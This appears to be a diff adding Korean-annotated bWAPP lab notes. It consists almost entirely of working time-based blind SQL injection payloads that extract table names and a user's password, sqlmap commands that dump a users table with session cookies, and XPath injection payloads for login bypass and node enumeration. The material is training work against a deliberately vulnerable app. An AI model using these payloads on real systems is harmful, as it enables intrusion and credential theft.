@@ -1,0 +1,165 @@
+'or 1=1 and sleep(1) #
+
+'or 1=1 and length(database())=1 and sleep(1) #
+'or 1=1 and length(database())=2 and sleep(1) #
+'or 1=1 and length(database())=3 and sleep(1) #
+'or 1=1 and length(database())=4 and sleep(1) #
+'or 1=1 and length(database())=5 and sleep(1) #     (참)
+
+'or 1=1 and substring(database(),1,1)='a' and sleep(1) #
+'or 1=1 and substring(database(),1,1)='b' and sleep(1) #
+'or 1=1 and substring(database(),2,1)='W' and sleep(1) #
+'or 1=1 and substring(database(),3,1)='A' and sleep(1) #
+'or 1=1 and substring(database(),4,1)='P' and sleep(1) #
+'or 1=1 and substring(database(),5,1)='P' and sleep(1) #
+
+답 = 'or 1=1 and database()='bWAPP' and sleep(1) #
+
+'or 1=1 and length((select table_name from information_schema.tables where table_schema='bWAPP' limit 1,1))=1 and sleep(1) #
+'or 1=1 and length((select table_name from information_schema.tables where table_schema='bWAPP' limit 1,1))=2 and sleep(1) #
+'or 1=1 and length((select table_name from information_schema.tables where table_schema='bWAPP' limit 1,1))=3 and sleep(1) #
+'or 1=1 and length((select table_name from information_schema.tables where table_schema='bWAPP' limit 1,1))=4 and sleep(1) #
+'or 1=1 and length((select table_name from information_schema.tables where table_schema='bWAPP' limit 1,1))=5 and sleep(1) #
+'or 1=1 and length((select table_name from information_schema.tables where table_schema='bWAPP' limit 1,1))=6 and sleep(1) #
+
+
+'or 1=1 and ascii(substring((select table_name from information_schema.tables where table_schema='bWAPP' limit 1,1),1,1))=104 and sleep(1) #
+'or 1=1 and ascii(substring((select table_name from information_schema.tables where table_schema='bWAPP' limit 1,1),2,1))=101 and sleep(1) #
+'or 1=1 and ascii(substring((select table_name from information_schema.tables where table_schema='bWAPP' limit 1,1),3,1))=114 and sleep(1) #
+'or 1=1 and ascii(substring((select table_name from information_schema.tables where table_schema='bWAPP' limit 1,1),4,1))=111 and sleep(1) #
+'or 1=1 and ascii(substring((select table_name from information_schema.tables where table_schema='bWAPP' limit 1,1),5,1))=101 and sleep(1) #
+'or 1=1 and ascii(substring((select table_name from information_schema.tables where table_schema='bWAPP' limit 1,1),6,1))=115 and sleep(1) #
+
+
+'or 1=1 and (select table_name from information_schema.tables where table_schema='bWAPP' limit 1,1)='heroes' and sleep(1) #
+
+'or 1=1 and length((select column_name from information_schema.columns where table_name='heroes' limit 1,1))=1 and sleep(1) #
+'or 1=1 and length((select column_name from information_schema.columns where table_name='heroes' limit 1,1))=2 and sleep(1) #
+'or 1=1 and length((select column_name from information_schema.columns where table_name='heroes' limit 1,1))=3 and sleep(1) #
+'or 1=1 and length((select column_name from information_schema.columns where table_name='heroes' limit 1,1))=4 and sleep(1) #
+'or 1=1 and length((select column_name from information_schema.columns where table_name='heroes' limit 1,1))=5 and sleep(1) #  (참)
+
+
+'or 1=1 and ascii(substring((select column_name from information_schema.columns where table_name='heroes' limit 1,1),1,1))=108 and sleep(1) #
+'or 1=1 and ascii(substring((select column_name from information_schema.columns where table_name='heroes' limit 1,1),2,1))=111 and sleep(1) #
+'or 1=1 and ascii(substring((select column_name from information_schema.columns where table_name='heroes' limit 1,1),3,1))=103 and sleep(1) #
+'or 1=1 and ascii(substring((select column_name from information_schema.columns where table_name='heroes' limit 1,1),4,1))=105 and sleep(1) #
+'or 1=1 and ascii(substring((select column_name from information_schema.columns where table_name='heroes' limit 1,1),5,1))=110 and sleep(1) #
+
+'or 1=1 and length((select login from heroes limit 2,1))=1 and sleep(1) #
+'or 1=1 and length((select login from heroes limit 2,1))=2 and sleep(1) #
+'or 1=1 and length((select login from heroes limit 2,1))=3 and sleep(1) #
+'or 1=1 and length((select login from heroes limit 2,1))=4 and sleep(1) #
+
+'or 1=1 and ascii(substring((select login from heroes limit 2,1),1,1))=116 and sleep(1) #
+'or 1=1 and ascii(substring((select login from heroes limit 2,1),2,1))=104 and sleep(1) #
+'or 1=1 and ascii(substring((select login from heroes limit 2,1),3,1))=111 and sleep(1) #
+'or 1=1 and ascii(substring((select login from heroes limit 2,1),4,1))=114 and sleep(1) #
+'or 1=1 and (select login from heroes limit 2,1)="thor" and sleep(1) #
+
+'or 1=1 and length((select column_name from information_schema.columns where table_name='heroes' limit 2,1))=1 and sleep(1) #
+'or 1=1 and length((select column_name from information_schema.columns where table_name='heroes' limit 2,1))=2 and sleep(1) #
+'or 1=1 and length((select column_name from information_schema.columns where table_name='heroes' limit 2,1))=3 and sleep(1) #
+'or 1=1 and length((select column_name from information_schema.columns where table_name='heroes' limit 2,1))=4 and sleep(1) #
+'or 1=1 and length((select column_name from information_schema.columns where table_name='heroes' limit 2,1))=5 and sleep(1) #
+'or 1=1 and length((select column_name from information_schema.columns where table_name='heroes' limit 2,1))=6 and sleep(1) #
+'or 1=1 and length((select column_name from information_schema.columns where table_name='heroes' limit 2,1))=7 and sleep(1) #
+'or 1=1 and length((select column_name from information_schema.columns where table_name='heroes' limit 2,1))=8 and sleep(1) #
+
+'or 1=1 and ascii(substring((select column_name from information_schema.columns where table_name='heroes' limit 2,1),1,1))=112 and sleep(1) #
+'or 1=1 and ascii(substring((select column_name from information_schema.columns where table_name='heroes' limit 2,1),2,1))=97 and sleep(1) #
+'or 1=1 and ascii(substring((select column_name from information_schema.columns where table_name='heroes' limit 2,1),3,1))=115 and sleep(1) #
+'or 1=1 and ascii(substring((select column_name from information_schema.columns where table_name='heroes' limit 2,1),4,1))=115 and sleep(1) #
+'or 1=1 and ascii(substring((select column_name from information_schema.columns where table_name='heroes' limit 2,1),5,1))=119 and sleep(1) #
+'or 1=1 and ascii(substring((select column_name from information_schema.columns where table_name='heroes' limit 2,1),6,1))=111 and sleep(1) #
+'or 1=1 and ascii(substring((select column_name from information_schema.columns where table_name='heroes' limit 2,1),7,1))=114 and sleep(1) #
+'or 1=1 and ascii(substring((select column_name from information_schema.columns where table_name='heroes' limit 2,1),8,1))=100 and sleep(1) #
+
+'or 1=1 and (select column_name from information_schema.columns where table_name='heroes' limit 2,1)='password' and sleep(1) #
+
+'or 1=1 and length((select password from heroes where login='thor'))=1 and sleep(1) #
+'or 1=1 and length((select password from heroes where login='thor'))=2 and sleep(1) #
+'or 1=1 and length((select password from heroes where login='thor'))=3 and sleep(1) #
+'or 1=1 and length((select password from heroes where login='thor'))=4 and sleep(1) #
+'or 1=1 and length((select password from heroes where login='thor'))=5 and sleep(1) #
+'or 1=1 and length((select password from heroes where login='thor'))=6 and sleep(1) #
+
+'or 1=1 and ascii(substring((select password from heroes where login='thor'),1,1)=65 and sleep(1) #
+'or 1=1 and ascii(substring((select password from heroes where login='thor'),2,1)=115 and sleep(1) #
+'or 1=1 and ascii(substring((select password from heroes where login='thor'),3,1)=103 and sleep(1) #
+'or 1=1 and ascii(substring((select password from heroes where login='thor'),4,1)=97 and sleep(1) #
+'or 1=1 and ascii(substring((select password from heroes where login='thor'),5,1)=114 and sleep(1) #
+'or 1=1 and ascii(substring((select password from heroes where login='thor'),6,1)=100 and sleep(1) #
+'or 1=1 and (select password from heroes where login='thor')="Asgard" and sleep(1) #
+
+http://192.168.20.205/bWAPP/sqli_14.php?title=&action=search
+Cookie: security_level=0; PHPSESSID=6adeed30f9cf0ae47b0ea0e1ecbc0e42
+
+sqlmap -u "http://192.168.20.205/bWAPP/sqli_14.php?title=&action=search" --cookie="security_level=0; PHPSESSID=6adeed30f9cf0ae47b0ea0e1ecbc0e42" -p title --dbms=sqlite --level=5 --risk=3 --dbs --tables
+
+
+sqlmap -u "http://192.168.20.205/bWAPP/sqli_14.php?title=&action=search" --cookie="security_level=0; PHPSESSID=9674c55f88585425073b95b96102bc7f" -p title --dbms=sqlite --level=5 --risk=3 -T users --columns
+
+sqlmap -u "http://192.168.20.205/bWAPP/sqli_14.php?title=&action=search" --cookie="security_level=0; PHPSESSID=9674c55f88585425073b95b96102bc7f" -p title --dbms=sqlite --level=5 --risk=3 -T users -C login,password,secret --dump
+
+
+[참고] Xpath 명령어
+
+/		최상위 노드
+//		현재 노드로부터 모든 노드 조회
+*		모든 노드 조회
+.		현재 노드
+..		상위 노드 접근
+parent		현재 노드의 상위 노드 조회
+child		현재 노드의 하위 노드 조회
+[]		조건문
+
+[참고] 실습에 사용될 함수
+
+count()		노드들의 개수 반환
+string-length()	문자열 길이 반환
+::*		지정 노드의 모든 내용 반환
+name()		노드 이름 반환
+substring()	지정한 문자열 반환
+position()		노드 위치 반환
+string()		인자로 받은 값을 문자열로 반환
+
+
+$result = $xml->xpath("/heroes/hero[login='" . $login . "' and password='" . $password . "']");
+
+$result = $xml->xpath("/heroes/hero[login='" . $login . "' and password='']");
+
+' or 1=1 or '
+
+$result = $xml->xpath("/heroes/hero[login='' or 1=1 or '' and password='']");
+
+' or 1=2 or '
+
+$result = $xml->xpath("/heroes/hero[login='' or 1=2 or '' and password='']");
+
+neo' and count(../child::*)=5 or '1'='1
+neo' and count(../child::*)=6 or '1'='1
+
+$result = $xml->xpath("/heroes/hero[login='neo' and count(../child::*)=6 or '1'='1' and password='']");
+
+neo' and string-length(name(parent::*))=5 or '1'='1
+neo' and string-length(name(parent::*))=6 or '1'='1
+
+neo' and substring(name(parent::*),1,1)='h' or '1'='1
+neo' and substring(name(parent::*),2,1)='e' or '1'='1
+neo' and substring(name(parent::*),3,1)='r' or '1'='1
+neo' and substring(name(parent::*),4,1)='r' or '1'='1
+neo' and substring(name(parent::*),5,1)='e' or '1'='1
+neo' and substring(name(parent::*),6,1)='s' or '1'='1
+neo' and name(parent::*)='heroes' or '1'='1
+
+neo' and string-length(name(../child::*[position()=1]))=1 or '1'='1
+neo' and string-length(name(../child::*[position()=1]))=2 or '1'='1
+neo' and string-length(name(../child::*[position()=1]))=3 or '1'='1
+neo' and string-length(name(../child::*[position()=1]))=4 or '1'='1
+
+neo' and substring(name(../child::*[position()=1]), 1,1)='h' or '1'='1
+neo' and substring(name(../child::*[position()=1]), 2,1)='e' or '1'='1
+neo' and substring(name(../child::*[position()=1]), 3,1)='r' or '1'='1
+neo' and substring(name(../child::*[position()=1]), 4,1)='o' or '1'='1
+neo' and name(../child::*[position()=1])='hero' or '1'='1
